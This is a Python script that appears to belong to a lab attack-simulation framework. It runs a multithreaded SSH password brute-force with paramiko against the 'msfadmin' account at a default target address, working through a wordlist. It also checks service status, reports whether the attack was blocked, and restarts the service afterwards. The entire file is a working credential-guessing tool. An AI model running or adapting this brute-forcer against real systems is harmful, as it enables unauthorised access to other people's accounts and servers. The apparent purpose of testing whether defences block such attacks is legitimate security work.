#!/usr/bin/python3

import sys
import socket
import threading
import time
from queue import Queue
import os

# installed packages
from pwn import *
import argparse
import paramiko

# declare script path
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# custom package
import pre_settings
import pre_ping_check
import pre_attacks
import pre_services_check
import pre_services_restart

# displays only critical errors or important information
context.log_level = pre_settings.debug_critical

# Disable all pwnlib logs -> remove this if debug
import logging
logging.getLogger("pwnlib").setLevel(logging.CRITICAL)
logging.getLogger("pwnlib.tubes.remote").setLevel(logging.CRITICAL)
logging.getLogger("pwnlib.tubes").setLevel(logging.CRITICAL)

password_counter = 0  # Global counter for password attempts
counter_lock = threading.Lock()  # Lock for safely updating the counter
stop_flag = threading.Event()  # Stop flag for successful brute force
lock = threading.Lock()  # Lock for synchronized output

def attempt_ssh_login(rhost, rport, password, attacks):
    if stop_flag.is_set():
        return None
    
    _stdin, _stdout, _stderr = None, None, None

    client = paramiko.client.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    username = 'msfadmin'
    
    try:
        # Check service status after each password attempt
        status_service_post = pre_services_check.check(rhost, rport)

        client.connect(rhost, port=rport, username=username, password=password, timeout=10)
        _stdin, _stdout, _stderr = client.exec_command("whoami")
        
        if _stdout.read().decode().strip() == username:
            stop_flag.set()  # Signal other threads to stop
            return attacks
        
    except paramiko.AuthenticationException:
        pass  # Incorrect password, continue
    except (paramiko.SSHException, socket.error, EOFError) as e:
        with lock:
            pass
    finally:
        client.close()

    # Increment the password counter after each attempt
    with counter_lock:
        global password_counter
        password_counter += 1
        log.debug(f"Attempted {password_counter} passwords. Service status after attempting password '{password}': {status_service_post}")

    return None


def worker(queue, rhost, rport, attacks):
    local_log = logging.getLogger('worker')  # Use a separate logger for worker threads
    local_log.setLevel(logging.CRITICAL)  # Set log level to CRITICAL
    
    while not queue.empty() and not stop_flag.is_set():
        password = queue.get()
        try:
            attempt_ssh_login(rhost, rport, password, attacks)
        except Exception as e:
            log.error(f"Error in worker thread: {str(e)}")
        finally:
            queue.task_done()

def exploit(rhost, rport, attacks, thread_count):
    global password_counter

    try:
        client = paramiko.SSHClient()

        # Add -oHostKeyAlgorithms=+ssh-rsa for backward compatibility with older hosts.
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        status_service_pre = pre_services_check.check(rhost, rport)
        status_ping = pre_ping_check.check(rhost)

        if not status_service_pre:
            log.debug(pre_settings.print_status_service_cleanup(rport, attacks['service'], status_service_pre, 'pre'))
            status_pre_service_restart = pre_services_restart.restart_service(rhost, attacks["path"])
            time.sleep(3)

        status_service_pre = pre_services_check.check(rhost, rport)

        attacks['status (ping)'] = 'UP' if status_ping else 'DOWN'
        attacks['status (service)'] = 'UP' if status_service_pre else 'DOWN'

        if status_service_pre:
            try:
                # Import wordlists from the provided 'payload' path.
                with open(attacks['payload'], 'r', encoding='latin-1') as file:
                    passwords = [line.strip() for line in file]

                # Create a queue and populate with passwords
                queue = Queue()
                for password in passwords:
                    queue.put(password)

                # Start worker threads to process passwords
                threads = []
                for _ in range(thread_count):
                    thread = threading.Thread(target=worker, args=(queue, rhost, rport, attacks))
                    thread.daemon = True
                    threads.append(thread)
                    thread.start()

                # Ensure main thread waits for all worker threads to complete
                for thread in threads:
                    thread.join()

                # If stop_flag is not set, the attack has failed
                if not stop_flag.is_set():
                    status_service_post = pre_services_check.check(rhost, rport)
                    with lock:
                        # fail bruteforce
                        log.debug(f'Attack fails. Total passwords tried: {password_counter}. {status_service_post}')
                        if not status_service_post:
                            attacks['remark'] = pre_attacks.fail_service_down_during_attack
                            print(pre_settings.print_status_attack_inaccessible(rhost, rport, attacks['service'], attacks['attack'], attacks['type'], status_ping, status_service_pre, False, status_service_post, attacks['remark']))
                        else:
                            attacks['remark'] = pre_attacks.fail_bruteforce
                            print(pre_settings.print_status_attack_inaccessible(rhost, rport, attacks['service'], attacks['attack'], attacks['type'], status_ping, status_service_pre, False, status_service_post, attacks['remark']))
                    return attacks
                else:
                    # success
                    attacks['status (attack)'] = 'UNBLOCKED'
                    attacks['remark'] = pre_attacks.success_bruteforce
                    status_service_post = pre_services_check.check(rhost, rport)

                    print(pre_settings.print_status_attack_inaccessible(rhost, rport, attacks['service'], attacks['attack'], attacks['type'], status_ping, status_service_pre, True, status_service_post, attacks['remark']))

                    return attacks

            except FileNotFoundError as e:
                log.error(str(e))
            except Exception as e:
                log.error(str(e))

        else:
            attacks['remark'] = pre_attacks.fail_service_down
            print(pre_settings.print_status_attack_inaccessible(rhost, rport, attacks['service'], attacks['attack'], attacks['type'], status_ping, status_service_pre, False, status_service_pre, attacks['remark']))

            return attacks

    except (paramiko.SSHException, paramiko.AuthenticationException, paramiko.ssh_exception.NoValidConnectionsError, socket.timeout, socket.error) as e:
        log.error(str(e))
        return False

    except (EOFError, pwnlib.exception.PwnlibException, ConnectionRefusedError, ValueError, Exception) as e:
        log.error(str(e))
        return False

    except KeyboardInterrupt:
        sys.exit(0)

    finally:
        client.close()

        # cleanup and restart the service
        time.sleep(2)
        log.debug(pre_settings.print_status_service_cleanup(rport, attacks['service'], pre_services_check.check(rhost, rport), 'cleanup'))
        status_post_service_restart = pre_services_restart.restart_service(rhost, attacks["path"])

def main():
    try:
        attacks = pre_attacks.attacks.get('bruteforce_ssh')

        parser = argparse.ArgumentParser(description=pre_settings.print_argparse_desc(attacks['attack']), epilog=f'{pre_settings.print_argparse_epilog(f"python3 {sys.argv[0]} --rhost 10.251.5.5")}')
        parser.add_argument('--rhost', help='Target IP', default='10.251.5.5')
        args = parser.parse_args()

        rhost = args.rhost
        rport = attacks['port']

        exploit(rhost, rport, attacks, thread_count=5)

    except KeyboardInterrupt:
        sys.exit(0)

if __name__ == '__main__':
    main()